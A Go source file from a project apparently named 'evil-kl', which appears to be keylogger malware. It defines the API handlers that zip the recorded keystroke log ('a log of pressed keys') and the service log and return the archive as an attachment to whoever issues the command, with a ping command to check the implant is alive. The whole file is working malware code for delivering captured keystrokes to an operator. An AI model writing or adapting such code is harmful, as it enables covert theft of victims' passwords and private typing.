package api

import (
	"encoding/json"
	"fmt"

	logger "github.com/dm1trypon/easy-logger"
	"github.com/dm1trypon/evil-kl/internal/pkg/zipper"
)

/*
Create <Api> - init Api structure
	Returns <*Api>:
		1. object's pointer
	Args:
		1. zipPath <string> - path to Zipper's result
		2. logPath <string> - log's path
		2. klPath <string> - keylogger's path
*/
func (a *Api) Create(zipPath, logPath, klPath string) *Api {
	a = &Api{
		lc:         "API",
		zipperInst: new(zipper.Zipper).Create(),
		zipPath:    zipPath,
		logPath:    logPath,
		klPath:     klPath,
	}

	return a
}

/*
GetKeyloggerData <Api> - getting a log of pressed keys in a zip archive
	Returns <string, string>:
		1. Body message
		2. Attached file path
	Args:
		1. method <string> - method
*/
func (a *Api) GetKeyloggerData(method string) (string, string) {
	trgtPath := a.zipPath
	klPath := a.klPath

	return a.bodyBuilder(method, trgtPath, []string{klPath})
}

/*
GetKeyloggerData <Api> - getting a log of service
	Returns <string, string>:
		1. Body message
		2. Attached file path
	Args:
		1. method <string> - method
*/
func (a *Api) GetLogs(method string) (string, string) {
	trgtPath := a.zipPath

	return a.bodyBuilder(method, trgtPath, []string{a.logPath})
}

/*
Ping <Api> - ping service
	Returns <string, string>:
		1. Body message
		2. Attached file path
	Args:
		1. method <string> - method
*/
func (a *Api) Ping(method string) (string, string) {
	return a.bodyBuilder(method, "", []string{})
}

/*
bodyBuilder <Api> - assembling the body of the message
	Returns <string, string>:
		1. Body message
		2. Attached file path
	Args:
		1. method <string> - method
		2. trgtPath <string> - target archive path
		3. files <[]string> - list of files to archive
*/
func (a *Api) bodyBuilder(method, trgtPath string, files []string) (string, string) {
	if len(files) < 1 {
		respPositive := ResponsePositive{
			Method: method,
			Text:   "OK",
		}

		respBody, err := json.Marshal(respPositive)
		if err != nil {
			logger.ErrorJ(a.lc, fmt.Sprint("Error making response body: ", err.Error()))
			return "Internal error", ""
		}

		return string(respBody), ""
	}

	if err := a.zipperInst.ZipFiles(trgtPath, files); err != nil {
		respNegative := ResponseNegative{
			Method: method,
			Error:  err.Error(),
		}

		respBody, err := json.Marshal(respNegative)
		if err != nil {
			logger.ErrorJ(a.lc, fmt.Sprint("Error making response body: ", err.Error()))
			return "Internal error", ""
		}

		return string(respBody), ""
	}

	respPositive := ResponsePositive{
		Method: method,
		Text:   "See your attachments",
	}

	respBody, err := json.Marshal(respPositive)
	if err != nil {
		logger.ErrorJ(a.lc, fmt.Sprint("Error making response body: ", err.Error()))
		return "Internal error", ""
	}

	return string(respBody), trgtPath
}
